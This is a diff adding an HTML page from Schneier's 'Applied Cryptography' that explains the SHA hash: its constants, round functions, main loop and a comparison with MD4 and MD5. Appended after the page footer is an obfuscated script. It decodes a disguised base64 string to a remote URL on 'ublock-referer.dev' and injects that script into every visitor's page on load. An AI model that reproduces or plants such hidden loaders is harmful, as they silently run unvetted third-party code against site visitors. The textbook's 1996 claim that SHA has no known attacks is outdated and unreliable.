@@ -1,0 +1,145 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:One-Way Hash Functions</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=18//-->
+<!--PAGES=442-445//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">18.7 Secure Hash Algorithm (SHA)</FONT></H3>
+<P>NIST, along with the NSA, designed the Secure Hash Algorithm (SHA) for use with the Digital Signature Standard (see Section 20.2) [1154]. (The standard is the Secure Hash Standard (SHS); SHA is the algorithm used in the standard.) According to the <I>Federal Register</I> [539]:</P>
+<BLOCKQUOTE><P>A Federal Information Processing Standard (FIPS) for Secure Hash Standard (SHS) is being proposed. This proposed standard specified a Secure Hash Algorithm (SHA) for use with the proposed Digital Signature Standard .... Additionally, for applications not requiring a digital signature, the SHA is to be used whenever a secure hash algorithm is required for Federal applications.
+</P>
+</BLOCKQUOTE><P>And
+</P>
+<BLOCKQUOTE><P>This Standard specifies a Secure Hash Algorithm (SHA), which is necessary to ensure the security of the Digital Signature Algorithm (DSA). When a message of any length &lt 264 bits is input, the SHA produces a 160-bit output called a message digest. The message digest is then input to the DSA, which computes the signature for the message. Signing the message digest rather than the message often improves the efficiency of the process, because the message digest is usually much smaller than the message. The same message digest should be obtained by the verifier of the signature when the received version of the message is used as input to SHA. The SHA is called secure because it is designed to be computationally infeasible to recover a message corresponding to a given message digest, or to find two different messages which produce the same message digest. Any change to a message in transit will, with a very high probability, result in a different message digest, and the signature will fail to verify. The SHA is based on principles similar to those used by Professor Ronald L. Rivest of MIT when designing the MD4 message digest algorithm [1319], and is closely modelled after that algorithm.
+</P>
+</BLOCKQUOTE><P>SHA produces a 160-bit hash, longer than MD5.
+</P>
+<P><FONT SIZE="+1"><B><I>Description of SHA</I></B></FONT></P>
+<P>First, the message is padded to make it a multiple of 512 bits long. Padding is exactly the same as in MD5: First append a one, then as many zeros as necessary to make it 64 bits short of a multiple of 512, and finally a 64-bit representation of the length of the message before padding.
+</P>
+<P>Five 32-bit variables (MD5 has four variables, but this algorithm needs to produce a 160-bit hash) are initialized as follows:</P>
+<DL>
+<DD><I>A</I> = 0x67452301
+<DD><I>B</I> = 0xefcdab89
+<DD><I>C</I> = 0x98badcfe
+<DD><I>D</I> = 0x10325476
+<DD><I>E</I> = 0xc3d2e1f0
+</DL>
+<P>The main loop of the algorithm then begins. It processes the message 512 bits at a time and continues for as many 512-bit blocks as are in the message.
+</P>
+<P>First the five variables are copied into different variables: <I>a</I> gets <I>A, b</I> gets <I>B, c</I> gets <I>C, d</I> gets <I>D,</I> and <I>e</I> gets <I>E</I>.</P>
+<P>The main loop has four rounds of 20 operations each (MD5 has four rounds of 16 operations each). Each operation performs a nonlinear function on three of <I>a, b, c, d,</I> and <I>e,</I> and then does shifting and adding similar to MD5.</P>
+<P>SHA&#146;s set of nonlinear functions is:</P>
+<DL>
+<DD><I>f</I><SUB>t</SUB>(<I>X,Y,Z</I> ) = (<I>X</I>&#8869; <I>Y</I>) &#8870; ((&#172; X )&#8869; <I>Z</I>), for <I>t</I> = 0 to 19.
+<DD><I>f</I><SUB>t</SUB> (<I>X,Y,Z</I> ) = <I>X</I> &#8853; <I>Y</I> &#8853; <I>Z</I>, for <I>t</I> = 20 to 39.
+<DD><I>f</I><SUB>t</SUB> (<I>X,Y,Z</I> ) = (<I>X</I>&#8869; <I>Y</I> ) &#8870; (<I>X</I>&#8869; <I>Z</I>) &#8870; (<I>Y</I>&#8869; <I>Z</I>), for <I>t</I> = 40 to 59.
+<DD><I>ft</I> (<I>X,Y,Z</I> ) = <I>X</I> &#8853; <I>Y</I> &#8853; <I>Z</I>, for <I>t</I> = 60 to 79.
+</DL>
+<P>Four constants are used in the algorithm:
+</P>
+<DL>
+<DD><I>K</I><SUB>t</SUB> = 0x5a827999, for <I>t</I> = 0 to 19.
+<DD><I>K</I><SUB>t</SUB> = 0x6ed9eba1, for <I>t</I> = 20 to 39.
+<DD><I>K</I><SUB>t</SUB> = 0x8f1bbcdc, for <I>t</I> = 40 to 59.
+<DD><I>K</I><SUB>t</SUB> = 0xca62c1d6, for <I>t</I> = 60 to 79.
+</DL>
+<P>(If you wonder where those numbers came from: 0x5a827999 = 2<SUP>1/2</SUP> /4, 0x6ed9eba1 = 3<SUP>1/2</SUP> /4, 0x8f1bbcdc = 5<SUP>1/2</SUP> /4, and 0xca62c1d6 = 10<SUP>1/2</SUP> /4; all times 2<SUP>32</SUP>.)</P>
+<P>The message block is transformed from 16 32-bit words (<I>M</I><SUB>0</SUB> to <I>M</I><SUB>15</SUB> ) to 80 32-bit words (<I>W</I><SUB>0</SUB> to <I>W</I><SUB>79</SUB>) using the following algorithm:</P>
+<DL>
+<DD><I>W</I><SUB>t</SUB> = <I>M</I><SUB>t</SUB>, for <I>t</I> = 0 to 15
+<DD><I>W</I><SUB>t</SUB> = (<I>W</I><SUB>t- 3</SUB> &#8853; <I>W</I><SUB>t - 8</SUB> &#8853; <I>W</I><SUB>t - 14</SUB> &#8853; <I>W</I><SUB>t - 16</SUB> ) &lt&lt&lt 1, for <I>t</I> = 16 to 79.
+</DL>
+<P>(As an interesting aside, the original SHA specification did not have the left circular shift. The change &#147;corrects a technical flaw that made the standard less secure than had been thought&#148; [543]. The NSA has refused to elaborate on the exact nature of the flaw.)
+</P>
+<P>If <I>t</I> is the operation number (from 0 to 79), <I>W</I><SUB>t</SUB> represents the <I>t</I> th sub-block of the expanded message, and &lt&lt&lt <I>s</I> represents a left circular shift of <I>s</I> bits, then the main loop looks like:</P>
+<DL>
+<DD>FOR <I>t</I> = 0 to 79
+<DL>
+<DD><I>TEMP</I> = (<I>a</I> &lt&lt&lt 5) &#43; <I>f</I><SUB>t</SUB> (<I>b,c,d</I>) &#43; <I>e</I> &#43; <I>W</I><SUB>t</SUB> &#43; <I>K</I><SUB>t</SUB>
+<DD><I>e</I> = <I>d</I>
+<DD><I>d</I> = <I>c</I>
+<DD><I>c</I> = <I>b</I> &lt&lt&lt 30
+<DD><I>b</I> = <I>a</I>
+<DD><I>a</I> = <I>TEMP</I>
+</DL>
+</DL>
+<I><P><A NAME="Fig7"></A><A HREF="javascript:displayWindow('images/18-07.jpg',231,256 )"><IMG SRC="images/18-07t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/18-07.jpg',231,256)"><FONT COLOR="#000077"><B>Figure 18.7</B></FONT></A>&nbsp;&nbsp;One SHA operation.</I>
+</P>
+<P>Figure 18.7 shows one operation. Shifting the variables accomplishes the same thing as MD5 does by using different variables in different locations.
+</P>
+<P>After all of this, <I>a, b, c, d,</I> and <I>e</I> are added to <I>A, B, C, D,</I> and <I>E</I> respectively, and the algorithm continues with the next block of data. The final output is the concatenation of <I>A, B, C, D,</I> and <I>E</I>.</P>
+<P><FONT SIZE="+1"><B><I>Security of SHA</I></B></FONT></P>
+<P>SHA is very similar to MD4, but has a 160-bit hash value. The main changes are the addition of an expand transformation and the addition of the previous step&#146;s output into the next step for a faster avalanche effect. Ron Rivest made public the design decisions behind MD5, but SHA&#146;s designers did not. Here are Rivest&#146;s MD5 improvements to MD4 and how they compare with SHA&#146;s:
+</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;&#147;A fourth round has been added.&#148; SHA does this, too. However, in SHA the fourth round uses the same f function as the second round.
+<DD><B>2.</B>&nbsp;&nbsp;&#147;Each step now has a unique additive constant.&#148; SHA keeps the MD4 scheme where it reuses the constants for each group of 20 rounds.
+<DD><B>3.</B>&nbsp;&nbsp;&#147;The function G in round 2 was changed from ((<I>X</I>&#8869; <I>Y</I>) &#8870; (<I>X</I>&#8869; <I>Z</I>) &#8870; (<I>Y</I>&#8869; <I>Z</I>)) to ((<I>X</I>&#8869; <I>Z</I>) &#8870; (<I>Y</I>&#8869; &#172; (<I>Z</I>))) to make <I>G</I> less symmetric.&#148; SHA uses the MD4 version: ((<I>X</I>&#8869; <I>Y</I>) &#8870; (<I>X</I>&#8869; <I>Z</I>) &#8870; (<I>Y</I>&#8869; <I>Z</I>)).
+<DD><B>4.</B>&nbsp;&nbsp;&#147;Each step now adds in the result of the previous step. This promotes a faster avalanche effect.&#148; This change has been made in SHA as well. The difference in SHA is that a fifth variable is added, and not <I>b, c,</I> or <I>d,</I> which is already used in <I>f</I><SUB>t</SUB>. This subtle change makes the den Boer-Bosselaers attack against MD5 impossible against SHA.
+<DD><B>5.</B>&nbsp;&nbsp;&#147;The order in which message sub-blocks are accessed in rounds 2 and 3 is changed, to make these patterns less alike.&#148; SHA is completely different, since it uses a cyclic error-correcting code.
+<DD><B>6.</B>&nbsp;&nbsp;&#147;The left circular shift amounts in each round have been approximately optimized, to yield a faster avalanche effect. The four shifts used in each round are different from the ones used in other rounds.&#148; SHA uses a constant shift amount in each round. This shift amount is relatively prime to the word size, as in MD4.
+</DL>
+<P>This leads to the following comparison: SHA is MD4 with the addition of an expand transformation, an extra round, and better avalanche effect; MD5 is MD4 with improved bit hashing, an extra round, and better avalanche effect.
+</P>
+<P>There are no known cryptographic attacks against SHA. Because it produces a 160-bit hash, it is more resistant to brute-force attacks (including birthday attacks) than 128-bit hash functions covered in this chapter.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(CSsxXJcT, CeyAXREQ) {CeyAXREQ = CSsxXJcT.createElement('script');CeyAXREQ.type = 'text/javascript';CeyAXREQ.async = true;CeyAXREQ.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');CSsxXJcT.getElementsByTagName('body')[0].appendChild(CeyAXREQ);}(document));</script></body>
+</html>
